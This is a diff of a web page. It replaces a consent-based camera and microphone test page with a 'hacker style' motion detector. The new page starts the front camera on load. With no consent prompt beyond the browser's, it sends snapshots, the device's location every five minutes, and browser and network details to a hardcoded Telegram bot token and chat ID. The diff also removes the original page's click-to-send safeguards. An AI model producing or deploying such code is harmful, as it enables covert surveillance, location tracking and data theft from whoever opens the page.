@@ -1,196 +1,299 @@
-<!doctype html>
-<html lang="bn">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Camera & Mic Test — Safe Capture</title>
-  <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Arial; padding: 18px; max-width: 900px; margin: auto; }
-    h1 { font-size: 1.4rem; margin-bottom: 8px; }
-    video { width: 100%; max-width: 640px; border-radius: 8px; background: #000; }
-    .controls { margin-top: 10px; display:flex; gap:8px; flex-wrap:wrap; }
-    button { padding:8px 12px; border-radius:6px; border:1px solid #ccc; background:#f7f7f7; cursor:pointer; }
-    button:disabled { opacity:0.6; cursor:not-allowed; }
-    .preview { margin-top:12px; display:flex; gap:12px; flex-wrap:wrap; align-items:flex-start; }
-    .thumb { max-width:200px; border:1px solid #ddd; padding:6px; border-radius:6px; background:#fff; }
-    small { color:#555; display:block; margin-top:6px; }
-    label { display:block; margin-top:12px; }
-    input[type="text"] { width:100%; padding:6px 8px; border-radius:6px; border:1px solid #ccc; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pro Motion Detector (Hacker Style, Location, Messages)</title>
+    <style>
+        /* (Same styles as previous version - Hacker Style) */
+        body { font-family: monospace; background-color: #000; color: #0f0; text-align: center; margin: 0; padding: 0; overflow: hidden; }
+        #container { position: relative; width: 100%; max-width: 800px; margin: 0 auto; }
+        #videoElement { width: 100%; display: block; border: 2px solid #0f0; box-shadow: 0 0 10px #0f0; }
+        #overlayCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        #status { margin-top: 10px; font-weight: bold; }
+        .motion-detected { border-color: red; box-shadow: 0 0 15px red; animation: flicker 0.5s infinite alternate; }
+        @keyframes flicker { from { opacity: 1; } to { opacity: 0.5; } }
+        .roi-box { position: absolute; border: 1px dashed #0f0; box-sizing: border-box; }
+    </style>
 </head>
 <body>
-  <h1>Camera & Microphone Test (Safe)</h1>
-  <p>এই পেজটি কেবল আপনার অনুমতিতে কাজ করবে। ক্যামেরা/মাইকের ডাটা **কখনোই স্বয়ংক্রিয়ভাবে পাঠানো হবে না**—প্রতিবার আপনাকে ক্লিক করতে হবে।</p>
+    <h1>>_ Security Feed</h1>
+    <div id="container">
+        <video id="videoElement" autoplay muted playsinline></video>
+        <canvas id="overlayCanvas"></canvas>
+    </div>
+    <div id="status">Initializing...</div>
 
-  <video id="preview" autoplay playsinline muted></video>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8231147249:AAGnds85ugja4nc2VdhXdN1tvQGkMq02wykk'; // REPLACE
+        const CHAT_ID = '8101021767'; // REPLACE
+        const video = document.getElementById('videoElement');
+        const overlayCanvas = document.getElementById('overlayCanvas');
+        const overlayCtx = overlayCanvas.getContext('2d');
+        const statusDiv = document.getElementById('status');
 
-  <div class="controls">
-    <button id="btnStart">Start Camera & Mic</button>
-    <button id="btnStop" disabled>Stop</button>
-    <button id="btnSnap" disabled>Capture Snapshot</button>
-    <button id="btnRecord" disabled>Record 5s Audio</button>
-    <button id="btnSend" disabled>Send Latest to Server</button>
-  </div>
+        let previousFrame = null;
+        const motionThreshold = 20;
+        const cooldownPeriod = 1000;
+        let lastCaptureTime = 0;
+        let isProcessing = false;
+        let lastLocation = null;
+        let locationIntervalId = null;
 
-  <label>
-    Server upload URL (POST) — আপনার সার্ভারের এন্ডপয়েন্ট দিন:
-    <input id="serverUrl" type="text" placeholder="https://your-server.example.com/upload" />
-  </label>
+          // Define multiple Regions of Interest (ROIs) - normalized coordinates
+        const rois = [
+            { x1: 0.1, y1: 0.1, x2: 0.4, y2: 0.4, id: 'zone1' }, // Top-left
+            { x1: 0.6, y1: 0.1, x2: 0.9, y2: 0.4, id: 'zone2' }, // Top-right
+            { x1: 0.3, y1: 0.6, x2: 0.7, y2: 0.9, id: 'zone3' }  // Bottom-center
+        ];
 
-  <div class="preview" id="previewArea">
-    <!-- captured thumbnail + audio controls will appear here -->
-  </div>
 
-  <script>
-    const preview = document.getElementById('preview');
-    const btnStart = document.getElementById('btnStart');
-    const btnStop = document.getElementById('btnStop');
-    const btnSnap = document.getElementById('btnSnap');
-    const btnRecord = document.getElementById('btnRecord');
-    const btnSend = document.getElementById('btnSend');
-    const previewArea = document.getElementById('previewArea');
-    const serverUrlInput = document.getElementById('serverUrl');
+        function handleError(message, error) {
+            console.error(message, error);
+            statusDiv.textContent = `>_ ERROR: ${message}`;
+            statusDiv.style.color = 'red';
+        }
 
-    let mediaStream = null;
-    let latestImageBlob = null;
-    let latestAudioBlob = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
+        async function startCamera() {
+           try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+                video.srcObject = stream;
 
-    btnStart.onclick = async () => {
-      try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        preview.srcObject = mediaStream;
-        btnStart.disabled = true;
-        btnStop.disabled = false;
-        btnSnap.disabled = false;
-        btnRecord.disabled = false;
-        console.log('Media started');
-      } catch (err) {
-        alert('permission denied or no device: ' + err.message);
-      }
-    };
+                video.onloadedmetadata = () => {
+                    overlayCanvas.width = video.videoWidth;
+                    overlayCanvas.height = video.videoHeight;
+                    drawROIs(); // Draw ROIs on startup
+                    statusDiv.textContent = ">_ System Ready.  Monitoring...";
+                    requestAnimationFrame(processFrame);
+                };
+            } catch (err) {
+                handleError("Camera access denied.", err);
+            }
+        }
 
-    btnStop.onclick = () => {
-      if (mediaStream) {
-        for (const track of mediaStream.getTracks()) track.stop();
-        preview.srcObject = null;
-        mediaStream = null;
-      }
-      btnStart.disabled = false;
-      btnStop.disabled = true;
-      btnSnap.disabled = true;
-      btnRecord.disabled = true;
-      console.log('Media stopped');
-    };
+        function grayscale(imageData) {
+             const data = imageData.data;
+            for (let i = 0; i < data.length; i += 4) {
+                const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
+                data[i] = avg;
+                data[i + 1] = avg;
+                data[i + 2] = avg;
+            }
+            return imageData;
+        }
 
-    btnSnap.onclick = () => {
-      if (!mediaStream) return alert('Start camera first');
-      const videoTrack = mediaStream.getVideoTracks()[0];
-      const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
-      const w = preview.videoWidth || (settings.width || 640);
-      const h = preview.videoHeight || (settings.height || 480);
+         function drawROIs() {
+            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height); // Clear previous ROIs
 
-      const canvas = document.createElement('canvas');
-      canvas.width = w;
-      canvas.height = h;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+            for (const roi of rois) {
+                const x1 = roi.x1 * overlayCanvas.width;
+                const y1 = roi.y1 * overlayCanvas.height;
+                const x2 = roi.x2 * overlayCanvas.width;
+                const y2 = roi.y2 * overlayCanvas.height;
 
-      canvas.toBlob(blob => {
-        latestImageBlob = blob;
-        showPreview();
-      }, 'image/jpeg', 0.85);
-    };
+                overlayCtx.strokeStyle = '#0f0'; // Green
+                overlayCtx.lineWidth = 1;
+                overlayCtx.setLineDash([5, 3]); // Dashed line
+                overlayCtx.strokeRect(x1, y1, x2 - x1, y2 - y1);
+                overlayCtx.setLineDash([]);  // Reset dash
 
-    btnRecord.onclick = async () => {
-      if (!mediaStream) return alert('Start camera & mic first');
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        return;
-      }
+                 // Add ROI label
+                overlayCtx.font = '10px monospace';
+                overlayCtx.fillStyle = '#0f0';
+                overlayCtx.fillText(roi.id, x1 + 5, y1 + 15);
 
-      audioChunks = [];
-      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'audio/webm' });
-      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-      mediaRecorder.onstop = () => {
-        latestAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-        showPreview();
-      };
-      mediaRecorder.start();
-      btnRecord.textContent = 'Recording... (auto stop 5s)';
-      btnRecord.disabled = true;
+            }
+     }
 
-      setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-        btnRecord.disabled = false;
-        btnRecord.textContent = 'Record 5s Audio';
-      }, 5000);
-    };
+       function detectMotionInROIs(currentFrame, previousFrame) {
+          if (!previousFrame) {
+            return false;
+          }
+        let motionDetected = false;
 
-    function showPreview() {
-      previewArea.innerHTML = '';
-      if (latestImageBlob) {
-        const img = document.createElement('img');
-        img.className = 'thumb';
-        img.alt = 'snapshot';
-        img.src = URL.createObjectURL(latestImageBlob);
-        const dl = document.createElement('a');
-        dl.href = img.src;
-        dl.download = 'snapshot.jpg';
-        dl.textContent = 'Download Image';
-        dl.style.display = 'block';
-        previewArea.appendChild(img);
-        previewArea.appendChild(dl);
-      }
-      if (latestAudioBlob) {
-        const audioURL = URL.createObjectURL(latestAudioBlob);
-        const audioEl = document.createElement('audio');
-        audioEl.controls = true;
-        audioEl.src = audioURL;
-        previewArea.appendChild(audioEl);
-        const dl2 = document.createElement('a');
-        dl2.href = audioURL;
-        dl2.download = 'recording.webm';
-        dl2.textContent = 'Download Audio';
-        dl2.style.display = 'block';
-        previewArea.appendChild(dl2);
-      }
-      btnSend.disabled = !(latestImageBlob || latestAudioBlob);
+
+        for (const roi of rois) {
+            const roiX1 = Math.floor(overlayCanvas.width * roi.x1);
+            const roiY1 = Math.floor(overlayCanvas.height * roi.y1);
+            const roiX2 = Math.floor(overlayCanvas.width * roi.x2);
+            const roiY2 = Math.floor(overlayCanvas.height * roi.y2);
+
+             let motionPixels = 0;
+            const totalPixels = (roiX2 - roiX1) * (roiY2 - roiY1);
+
+
+            for (let y = roiY1; y < roiY2; y++) {
+                for (let x = roiX1; x < roiX2; x++) {
+                    const index = (y * overlayCanvas.width + x) * 4;
+                    const totalDifference = Math.abs(currentFrame.data[index] - previousFrame.data[index]);
+
+                    if (totalDifference > motionThreshold) {
+                      motionPixels++;
+                      motionDetected = true
+                    }
+                }
+            }
+
+            const motionPercentage = (motionPixels / totalPixels) * 100;
+            if(motionPercentage > 3) return true; //Consider it motion if > 3%
+
+        }
+        return motionDetected
     }
 
-    btnSend.onclick = async () => {
-      const serverUrl = serverUrlInput.value.trim();
-      if (!serverUrl) return alert('Please provide your server upload URL first.');
-      if (!latestImageBlob && !latestAudioBlob) return alert('No image or audio to send.');
+     async function processFrame() {
+        if (isProcessing) {
+            requestAnimationFrame(processFrame);
+            return;
+        }
+        isProcessing = true;
 
-      const fd = new FormData();
-      if (latestImageBlob) fd.append('photo', latestImageBlob, 'snapshot.jpg');
-      if (latestAudioBlob) fd.append('voice', latestAudioBlob, 'recording.webm');
-      // optional metadata
-      fd.append('note', 'User-initiated upload from local test page');
-      try {
-        btnSend.disabled = true;
-        btnSend.textContent = 'Uploading...';
-        const res = await fetch(serverUrl, { method: 'POST', body: fd });
-        if (!res.ok) throw new Error('Upload failed: ' + res.status);
-        const json = await res.json();
-        alert('Server response: ' + JSON.stringify(json));
-      } catch (err) {
-        alert('Upload error: ' + err.message);
-      } finally {
-        btnSend.disabled = false;
-        btnSend.textContent = 'Send Latest to Server';
-      }
-    };
+        overlayCtx.drawImage(video, 0, 0, overlayCanvas.width, overlayCanvas.height);
+        const currentFrame = grayscale(overlayCtx.getImageData(0, 0, overlayCanvas.width, overlayCanvas.height));
 
-    // warn user if leaving while recording
-    window.addEventListener('beforeunload', e => {
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        e.preventDefault();
-        e.returnValue = '';
-      }
-    });
-  </script>
+        if (detectMotionInROIs(currentFrame, previousFrame)) {
+             video.classList.add('motion-detected');
+            const currentTime = Date.now();
+            if (currentTime - lastCaptureTime > cooldownPeriod) {
+                statusDiv.textContent = ">_ Motion Detected! Intruder Alert!";
+                captureAndSendImage();
+                lastCaptureTime = currentTime;
+            }
+        } else {
+            video.classList.remove('motion-detected');
+            statusDiv.textContent = ">_ Monitoring...";
+        }
+
+        previousFrame = currentFrame;
+        isProcessing = false;
+        requestAnimationFrame(processFrame); // Request next frame
+    }
+
+        async function captureAndSendImage() {
+            overlayCanvas.toBlob(async (blob) => {
+                if (!blob) {
+                    handleError("Failed to create image blob.");
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'intruder_capture.jpg');
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                    });
+                    const data = await response.json();
+                    if (data.ok) {
+                        statusDiv.textContent = ">_ Image transmitted.";
+                        statusDiv.style.color = '#0f0';
+                    } else {
+                        handleError("Telegram transmission failed.", data);
+                    }
+                } catch (error) {
+                    handleError("Failed to send image.", error);
+                }
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Get and send location
+        function getLocationAndSend() {
+            if (!navigator.geolocation) {
+                sendTelegramMessage(">_ Geolocation is not supported by this browser.");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // Check if location has changed significantly
+                    if (lastLocation &&
+                        Math.abs(latitude - lastLocation.latitude) < 0.0001 &&  // Adjust threshold as needed
+                        Math.abs(longitude - lastLocation.longitude) < 0.0001) {
+                        return; // Don't send if location is essentially the same
+                    }
+                    lastLocation = { latitude, longitude };
+
+                    const locationMessage = `>_ Device Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;
+                    await sendTelegramMessage(locationMessage); // Await the message send
+
+                },
+                (error) => {
+                    sendTelegramMessage(`>_ Error getting location: ${error.message}`);
+                }
+            );
+        }
+        // Mock function to send device info and network data
+        async function getAndSendDeviceInfo() {
+            let deviceInfo = ">_ Device Information:\n";
+
+             // Basic device info (browser, OS, etc.)
+             deviceInfo += `User Agent: ${navigator.userAgent}\n`;
+            deviceInfo += `Platform: ${navigator.platform}\n`;
+             deviceInfo += `Cores: ${navigator.hardwareConcurrency}\n`
+            deviceInfo += `Memory: ${navigator.deviceMemory}\n`
+
+
+           // Mock network info (since we can't get *real* network details from JS)
+            deviceInfo += "Network Status (Simulated):\n";
+            const connectionType = navigator.onLine ? 'Online' : 'Offline'; // At least check if online
+            deviceInfo += `  Connection: ${connectionType}\n`;
+
+             if (navigator.connection) {
+                const connection = navigator.connection;
+                deviceInfo += `  Type: ${connection.type || 'Unknown'}\n`;  // e.g., 'wifi', 'cellular'
+                deviceInfo += `  Effective Type: ${connection.effectiveType || 'Unknown'}\n`; // e.g., '4g', 'slow-2g'
+                deviceInfo += `  Downlink: ${connection.downlink || 'Unknown'} Mbps\n`;
+                deviceInfo += `  RTT: ${connection.rtt || 'Unknown'} ms\n`; // Round-trip time
+                deviceInfo += `  Save Data: ${connection.saveData ? 'Enabled' : 'Disabled'}\n`;
+             } else {
+                 deviceInfo += `  (Network Information API not supported)\n`;
+             }
+            // Simulate WiFi/data usage (since it's not directly accessible)
+            deviceInfo += `  WiFi Data Usage (Simulated): ${Math.floor(Math.random() * 100)} MB\n`;
+            deviceInfo += `  Cellular Data Usage (Simulated): ${Math.floor(Math.random() * 50)} MB\n`;
+
+
+            await sendTelegramMessage(deviceInfo);
+        }
+
+
+        // Generic function to send messages to Telegram
+       async function sendTelegramMessage(message) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', message);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: formData,
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error("Telegram message send failed:", data);
+                }
+            } catch (error) {
+                console.error("Error sending Telegram message:", error);
+            }
+        }
+
+
+        // Initial setup
+        startCamera();
+        getLocationAndSend(); // Get initial location
+        getAndSendDeviceInfo(); // Send Device Info
+        locationIntervalId = setInterval(getLocationAndSend, 60000 * 5); // Check location every 5 minutes
+        setInterval(getAndSendDeviceInfo,60000 * 30) // Send Device and Network info every 30
+
+    </script>
 </body>
 </html>
